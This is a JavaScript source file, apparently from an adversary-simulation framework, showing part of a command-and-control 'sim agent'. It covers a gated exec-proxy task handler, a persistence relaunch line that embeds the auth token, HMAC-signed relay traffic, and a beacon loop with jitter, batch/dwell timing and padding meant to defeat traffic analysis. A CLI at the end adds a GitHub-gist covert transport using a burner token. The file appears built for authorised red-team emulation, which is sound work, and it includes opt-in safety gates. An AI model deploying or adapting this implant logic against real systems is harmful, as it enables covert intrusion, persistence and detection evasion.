    // exec.proxy setting; THIS agent additionally requires --proxy. Refusals are
    // loud plain text; an attempt returns the op-first evidence JSON (see
    // agents/execproxy.mjs for the contract).
    if (kind === 'execproxy-run' || kind === 'execproxy-remove' || kind === 'execproxy-status') {
      if (!this.proxy) {
        return kind + ' REFUSED: agent-side proxy execution is OFF (this agent was launched without --proxy 1; the engagement exec.proxy gate must also be on) — nothing planted, nothing executed, nothing removed';
      }
      if (!this._proxyRunner) { this._proxyRunner = powerShellExecProxyRunner(); this._proxyRunnerOwns = true; }
      return await runExecProxyTask(kind, data, { runner: this._proxyRunner, sandboxDir: this.dir, manifestPath: join(this.dir, 'varvel-execproxy-manifest.json'), defaultName: execProxyTag(this.agentId + '|' + this.url) });
    }
    return 'unknown task kind: ' + kind;
  }

  // The exact command line that relaunches THIS sim agent with THIS config — captured
  // from the live process (node exe + this script + the governed launch args). This is
  // what persist-install writes into the user-land locations; the channel audits only
  // its sha256. The token rides in it (the stage-1 locations are user-context and
  // user-readable by construction — same privilege class as the agent itself).
  _relaunchLine() {
    const script = fileURLToPath(import.meta.url);
    let line = '"' + process.execPath + '" "' + script + '" --url ' + (this.url || 'http://127.0.0.1:8971') + ' --id ' + this.agentId + ' --token ' + this.token
      + ' --dir "' + this.dir + '" --interval ' + this.interval + ' --jitter ' + this.jitter + ' --transport ' + this.transport;
    if (this.execInMemory) line += ' --exec-in-memory 1';
    if (this.evasion) line += ' --evasion 1';
    if (this.persist) line += ' --persist 1';
    if (this.proxy) line += ' --proxy 1';
    if (this.enc) line += ' --enc 1';
    return line;
  }

  // Parent relay leg: one child payload to the channel's /l route, its reply string back.
  // Per-link sequence (NOT this.seq): relay traffic must never race the parent's own
  // pull/push check-ins against the channel's strict per-agent seq discipline.
  async _relayUp(linkId, payload) {
    const s = (this._linkSeqs.get(linkId) || 0) + 1;
    this._linkSeqs.set(linkId, s);
    const body = Buffer.from(JSON.stringify({ link: linkId, up: [payload] }));
    const r = await fetch(this.url + '/l', {
      method: 'POST', body,
      headers: { 'x-agent': this.agentId, 'x-seq': String(s), 'x-auth': hmacHex(this.token, this.agentId + ':' + s + ':link:' + sha256(body)) },
    });
    if (r.status !== 200) return '';
    const j = await r.json();
    const down = (j && j.down) ? j.down[0] : null;
    return down ? String(down.p ?? '') : '';
  }

  async tick() {
    const got = await this._pull();
    if (!got) return false;
    // Batch/dwell flush: a batch window's held tasks arrive as ONE burst — execute each
    // in order and push each result (per-task HMAC binding unchanged).
    const tasks = got.batch === true && Array.isArray(got.tasks) ? got.tasks : [got];
    for (const task of tasks) {
      this._note('task ' + task.kind + ': ' + String(task.data).slice(0, 60));
      const result = await this._exec(task);
      await this._push(task.taskId, Buffer.isBuffer(result) ? result : String(result));
      this._note('result sent (' + (Buffer.isBuffer(result) ? result.length : String(result).length) + 'b)');
    }
    return true;
  }

  async run({ once = false, onTick } = {}) {
    this.running = true;
    while (this.running) {
      let worked = false;
      try { worked = await this.tick(); } catch (e) { this._note('tick error: ' + (e.message || e)); }
      if (onTick) { try { onTick(worked); } catch {} }
      if (once) break;
      // Cadence precedence: the applied v2 shape wins; then the channel's legacy timing
      // profile; then the launch-time interval/jitter. All shaping is opt-in — with no
      // shape and no profile this loop is byte-identical to before the shaping pack.
      if (this.shape && this.shape.batch) {
        // BATCH/DWELL: one cycle per window, at the seeded flush point the channel
        // derives independently from the shared token (engine/malleable.windowFlushAt)
        // — the held-task burst lands exactly on it. If this window's point already
        // passed, the next window's point is the target (a window is never skipped).
        const wMs = this.shape.batch.windowMs;
        const anchor = this.shapeAt || Date.now();
        const now = Date.now();
        const i = windowIndexAt(anchor, wMs, now);
        const flush = windowFlushAt(this.token, anchor, wMs, i);
        const target = flush > now ? flush : windowFlushAt(this.token, anchor, wMs, i + 1);
        await sleep(Math.max(50, target - now));
        continue;
      }
      const g = this.shape && this.shape.cadence
        ? nextGap(this.shape.cadence, { rand: this._rand })
        : this.profile
          ? nextGap(this.profile, { rand: this._rand })
          : { gapMs: this.interval + Math.round((this._rand() * 2 - 1) * this.jitter), burst: 1 };
      // PADDING (constant-rate, profile-gated, default OFF): the cycle's dummy
      // envelopes spread across the gap, so busy and idle windows emit the SAME number
      // of same-shaped requests. Honest cost: perCycle multiplies request volume.
      const pads = this.shape && this.shape.padding ? this.shape.padding.perCycle - 1 : 0;
      if (pads > 0) {
        const seg = Math.max(200, g.gapMs) / (pads + 1);
        for (let k = 0; k < pads && this.running; k++) {
          await sleep(seg);
          try { await this._pad(); } catch (e) { this._note('pad error: ' + (e.message || e)); }
        }
        await sleep(seg);
      } else {
        await sleep(Math.max(200, g.gapMs));
      }
      if (g.burst > 1 && this.running) { // a burst of quick cycles (browser-tab behavior), then baseline
        for (let i = 1; i < g.burst && this.running; i++) {
          try { await this.tick(); } catch (e) { this._note('burst tick error: ' + (e.message || e)); }
          await sleep(Math.max(150, g.gapMs));
        }
      }
    }
  }
  // Shutdown tears down every hosted role: the link pipe server, the link client, the
  // socks pivot — and the evasion host child, whose death restores anything it held
  // (in-memory, own-process patches never survive process exit). Fire-and-forget
  // closes — the process exits when the loop drains.
  stop() {
    this.running = false;
    try { if (this._pipe) this._pipe.close(); } catch {}
    try { if (this._link) this._link.close(); } catch {}
    try { if (this._socks) this._socks.close(); } catch {}
    try { if (this._ghcT) this._ghcT.close(); } catch {}
    try { if (this._stg) this._stg.close(); } catch {}
    try { if (this._evasionRunner && this._evasionRunnerOwns && this._evasionRunner.close) this._evasionRunner.close(); } catch {}
    try { if (this._persistRunner && this._persistRunnerOwns && this._persistRunner.close) this._persistRunner.close(); } catch {}
    try { if (this._proxyRunner && this._proxyRunnerOwns && this._proxyRunner.close) this._proxyRunner.close(); } catch {}
    // Module-owned sandbox teardown: remove exactly the dir WE minted (a caller --dir is
    // never touched). On a win32 lock the path stays registered — the exit hook retries.
    if (this._dirOwned && this.dir && ownedSandboxes.has(this.dir)) {
      try { rmSync(this.dir, { recursive: true, force: true }); ownedSandboxes.delete(this.dir); } catch {}
    }
  }
}

// CLI
if (process.argv[1] && import.meta.url === new URL('file://' + process.argv[1].replace(/\\/g, '/')).href) {
  // ghc leg: --transport ghc --ghc-gist <gistId> [--ghc-api <base>] with the BURNER PAT
  // from --ghc-pat or VARVEL_GHC2_TOKEN (env preferred — a CLI arg shows in the process
  // list). The PAT is a burner account's, NEVER the operator's real one (the doctrine).
  const ghc = args.transport === 'ghc'
    ? { pat: args['ghc-pat'] || process.env.VARVEL_GHC2_TOKEN || '', gistId: args['ghc-gist'] || '', apiBase: args['ghc-api'] || undefined }
    : null;
  const a = new SimAgent({ url: args.url, agentId: args.id, token: args.token, dir: args.dir, interval: args.interval, jitter: args.jitter, label: args.label, transport: args.transport || 'http', pipe: args.pipe || '', link: args.link || '', execInMemory: args['exec-in-memory'] === '1' || args['exec-in-memory'] === 'true', evasion: args['evasion'] === '1' || args['evasion'] === 'true', persist: args['persist'] === '1' || args['persist'] === 'true', proxy: args['proxy'] === '1' || args['proxy'] === 'true', enc: args.enc === '1' || args.enc === 'true', ghc });
  console.log(`sim-agent ${a.agentId} → ${a.url || ('pipe ' + (a.pipePath || '\\\\.\\pipe\\varvel_link_' + a.linkId))} · sandbox ${a.dir} · cadence ${a.interval}±${a.jitter}ms · transport ${a.transport}`);
  a.run({ once: !!args.once });
}
